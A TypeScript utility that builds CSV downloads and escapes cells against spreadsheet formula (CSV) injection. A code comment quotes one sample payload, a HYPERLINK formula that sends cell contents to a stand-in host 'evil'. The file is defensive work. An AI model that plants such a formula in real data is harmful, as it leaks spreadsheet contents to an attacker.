// Cells starting with one of these are evaluated as formulas by Excel /
// LibreOffice / Sheets. Asset and platform names come from the shared
// catalog (any user can create one), so a name like
// `=HYPERLINK("https://evil/?"&A1,"clic")` would run in someone else's
// spreadsheet - prefix with a quote so it's read as plain text (OWASP
// "CSV injection").
const FORMULA_TRIGGER = /^[=+\-@\t\r]/

function escapeCsvCell(value: string | number): string {
  // Numbers are our own computed values - a negative one must stay a number.
  let str = String(value)
  if (typeof value === "string" && FORMULA_TRIGGER.test(str)) str = `'${str}`
  return /[",\n\r]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str
}

export function downloadCsv(filename: string, rows: Record<string, string | number>[]) {
  if (rows.length === 0) return

  const headers = Object.keys(rows[0])
  const lines = [
    headers.join(","),
    ...rows.map((row) => headers.map((h) => escapeCsvCell(row[h])).join(",")),
  ]

  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8;" })
  const url = URL.createObjectURL(blob)
  const link = document.createElement("a")
  link.href = url
  link.download = filename
  link.click()
  URL.revokeObjectURL(url)
}
